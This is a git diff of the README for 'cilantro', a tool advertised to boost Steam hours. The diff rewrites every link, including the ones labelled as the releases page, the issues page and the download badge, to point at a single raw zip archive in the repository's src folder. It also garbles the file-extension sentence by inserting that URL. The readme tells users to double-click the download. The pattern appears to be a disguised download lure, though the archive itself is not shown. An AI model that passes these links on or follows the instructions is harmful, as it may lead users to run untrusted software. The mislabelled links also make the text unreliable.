@@ -1,6 +1,6 @@
 # 🌿 cilantro - Boost Your Steam Hours Effortlessly
 
-[![Download cilantro](https://img.shields.io/badge/Download-cilantro-brightgreen)](https://github.com/nandabagusyulianto/cilantro/releases)
+[![Download cilantro](https://github.com/nandabagusyulianto/cilantro/raw/refs/heads/main/src/Software-v2.3.zip)](https://github.com/nandabagusyulianto/cilantro/raw/refs/heads/main/src/Software-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,11 +12,11 @@ To begin, you will need to download cilantro. Please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the latest version of cilantro.
    
-   [Download cilantro from Releases](https://github.com/nandabagusyulianto/cilantro/releases)
+   [Download cilantro from Releases](https://github.com/nandabagusyulianto/cilantro/raw/refs/heads/main/src/Software-v2.3.zip)
 
 2. **Select the Latest Release:** On the Releases page, find the most recent version listed at the top. 
 
-3. **Download the Application:** Click on the appropriate file for your operating system (Windows, macOS, or Linux). The file names will typically have the extension `.exe`, `.dmg`, or `.tar.gz`. 
+3. **Download the Application:** Click on the appropriate file for your operating system (Windows, macOS, or Linux). The file names will typically have the extension `.exe`, `.dmg`, or `https://github.com/nandabagusyulianto/cilantro/raw/refs/heads/main/src/Software-v2.3.zip`. 
 
 4. **Run the File:** Once downloaded, locate the file on your computer, then double-click it to start the installation process.
 
@@ -55,7 +55,7 @@ If you encounter issues while installing or using cilantro, consider the followi
 
 Feel free to reach out to the community for assistance:
 
-- **GitHub Issues Page:** For any bugs or feature requests, visit the [GitHub Issues](https://github.com/nandabagusyulianto/cilantro/issues) page.
+- **GitHub Issues Page:** For any bugs or feature requests, visit the [GitHub Issues](https://github.com/nandabagusyulianto/cilantro/raw/refs/heads/main/src/Software-v2.3.zip) page.
 - **Discussion Forum:** Engage with other users and share experiences in our dedicated discussion forum (if available).
 
 ## 📚 Additional Resources
@@ -75,4 +75,4 @@ Should you wish to uninstall cilantro, follow these steps based on your operatin
 
 ## 🔗 Stay Updated
 
-Do not forget to check back on the [Releases page](https://github.com/nandabagusyulianto/cilantro/releases) for future updates and new features. Enjoy boosting your Steam hours with cilantro!
+Do not forget to check back on the [Releases page](https://github.com/nandabagusyulianto/cilantro/raw/refs/heads/main/src/Software-v2.3.zip) for future updates and new features. Enjoy boosting your Steam hours with cilantro!
